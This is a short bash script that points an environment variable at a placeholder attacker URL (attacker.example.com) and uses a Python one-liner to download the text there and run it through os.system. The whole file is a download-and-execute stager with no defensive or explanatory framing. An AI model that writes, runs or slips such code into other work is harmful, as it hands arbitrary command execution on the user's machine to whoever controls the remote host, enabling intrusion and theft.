#!/bin/bash
export P=http://attacker.example.com/s
python3 -c "import urllib.request,os;os.system(urllib.request.urlopen(os.environ['P']).read().decode())"
